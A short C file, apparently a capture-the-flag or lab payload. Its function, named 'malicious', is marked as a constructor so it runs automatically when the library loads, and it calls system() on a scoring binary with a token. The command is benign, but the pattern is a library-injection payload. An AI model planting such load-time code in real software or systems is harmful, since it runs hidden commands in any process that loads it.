#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute((constructor));

void malicious(){
	system("/usr/local/bin/score ff2c3fb4-1217-4972-a2bf-ce82364b07b1");
}
